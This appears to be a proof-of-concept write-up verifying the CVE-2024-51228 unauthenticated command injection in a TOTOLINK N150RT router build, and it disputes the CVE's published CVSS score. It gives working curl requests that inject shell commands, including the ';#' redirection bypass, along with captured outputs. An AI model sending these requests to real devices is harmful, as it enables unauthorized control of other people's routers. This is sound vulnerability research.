# PoC 02 — unauthenticated command execution, and a CVSS vector that is wrong

CVE-2024-51228, reproduced on the build it names, plus the measurement that
contradicts its published score.

## Scope

| | |
|---|---|
| verified on hardware | 2018-01-10 build, `TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002`, `/bin/boa` `sha256 19fe29d7…` |
| verified in emulation | **yes** — same build under `qemu-user`, this unit's flash as `/dev/mtdblock0`, no device attached |
| present statically, **not executed** | `formSysCmd` is in **neither** published image's dispatch table — absent from V2.1.2 and V3.4.0, present here ([`three-way-read.md`](../notes/three-way-read.md)) |
| not tested at all | the other five products CVE-2024-51228 names |

That third row is unusual and worth reading twice: **the handler this PoC
attacks does not exist in either firmware you can download.** It is in this
build only. Which is also why the CVE went unfound by this project for two
weeks — see *Identification* below.

## The request

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=ping -c 3 10.1.1.100' \
  --data 'submit-url=/syscmd.htm'
```

No `Authorization` header. Response is `302` — **and the response tells you
nothing**, which is the whole difficulty and the reason for what follows.

## Why the response cannot be the oracle

`/bin/boa` builds the command with this format string:

```c
"%s 2>&1 > %s"        /* sysCmd, "/tmp/syscmd.log" */
```

Your command goes in **first** and the handler's own redirection follows it. So
`system()`'s output goes to a log file on a tmpfs and never enters the HTTP
response. **"Look for `uid=0(root)` in the reply" cannot ever succeed on this
device**, and a PoC written that way reports failure against a working
injection.

Three channels are used instead, in ascending order of side effect. The order
is the method, not housekeeping: if the first channel that writes something had
been used first and failed, you could not tell a failed injection from an oracle
you cannot see.

### Channel 1 — ICMP, which writes nothing at all

```bash
sudo tcpdump -ni <iface> -w icmp.pcap icmp &
# ... the request above ...
tshark -r icmp.pcap -T fields -e ip.src -e ip.dst -e icmp.type
```

```text
10.1.1.1	10.1.1.100	8      <- echo REQUEST, sourced from the router
10.1.1.100	10.1.1.1	0
```

**The judgement is the direction and the type together, not "is there ICMP".**
In the control — an ordinary `ping` from the bench host — the router sends
type **0**, a reply. Here it sends type **8**, a request. That is the
difference between "it answered me" and "it ran a program for me".

Four packets arrive for `-c 3`, with ICMP sequence numbers 0…3 one second
apart. That is one run of BusyBox 1.13.4's `ping`, not two executions of the
handler — the sequence numbers settle it in one command, and without them four
packets for a count of three looks like a double submit.

### Channel 2 — the document root, which writes to a tmpfs

```bash
curl -s -o /dev/null -X POST http://10.1.1.1/boafrm/formSysCmd \
  --data-urlencode 'sysCmd=cat /etc/version > /var/web/w06.txt;#' \
  --data 'submit-url=/syscmd.htm'
sleep 2
curl -s http://10.1.1.1/w06.txt
```

```text
TOTOLINK-CX-N150RT-V2.1.6-B20171121.1002
```

**`;#` is load-bearing.** Without it the command becomes
`cat /etc/version > /var/web/w06.txt 2>&1 > /tmp/syscmd.log`, the last stdout
redirection wins, and you get a file that exists and is empty — `HTTP 204`, zero
bytes. **An empty file and a filtered parameter look identical**, so a PoC
missing two characters reports the wrong conclusion with no error anywhere.

`/var` is `ramfs` (mounted by `rcS` line 10) and `/web` is a symlink to
`/var/web`, so this writes nothing non-volatile. Clean up explicitly rather than
by rebooting — otherwise you cannot tell "I deleted it" from "the reboot did".

### Channel 3 — the SPI flash

[`03-flash-evidence.md`](03-flash-evidence.md). That one is this project's own.

## The score

| source | says |
|---|---|
| NVD CVSS 3.1 | `AV:A/AC:L/**PR:H**/UI:N/S:U/C:H/I:H/A:H` → 6.8 MEDIUM |
| the original researcher | "without credentials" |
| **this measurement** | no credentials, and **the identical request with credentials behaves identically** |

That last clause is the one that matters. Showing an unauthenticated request
works is not enough on its own — it leaves open that something else was carried
in. Firing the same request **with** valid credentials and getting the same four
echo requests is what closes it.

If `PR:N` is right the base score is **8.8 HIGH**, not 6.8 MEDIUM. This is a
correction to a public record, and it is the third one this project has found in
the same series: `CVE-2025-3992` and `CVE-2025-3995` name endpoints that do not
exist in any of the three dispatch tables recovered here.

## Identification — why this was nearly missed

The unit's `/etc/version` reads `TOTOLINK-**CX**-N150RT-V2.1.6-B20171121.1002`
and CVE-2024-51228 names exactly that string. But **`CX` appears in one file in
the entire root filesystem**, and the web interface does not use it: everything a
remote observer can read says `TOTOLINK-N150RT-V2.1.6-B20171121.1002`.

So the only identifier obtainable over the network does not match the CVE's
affected-product string. That is a property of the vendor's build, not of this
unit, and it generalises to anyone fingerprinting the model.

## Reproducing it without a device

```bash
sudo tools/qemu-env.sh serve 8080
./poc/run.sh --emulated
```

The emulated server refuses to report itself up unless a gated page redirects
**and** an exempt page is served — the gate model read at instruction level in
W04-2. "It answered" is not "this firmware is answering the way this firmware
answers".

## What this does not show

- **This vulnerability is not this project's discovery.** It was published
  2024-11-27. Independently deriving the reachability is verification work.
- **It says nothing about the two downloadable images.** `formSysCmd` is in
  neither dispatch table, so nothing here transfers to V2.1.2 or V3.4.0.
- The injection needs POST: the same parameters in a query string return `302`
  and execute nothing, because `translate_uri` redirects before `handleForm`.
  **That is not "no CSRF surface"** — this build authenticates with stateless
  HTTP Basic and a browser re-sends cached credentials by itself.
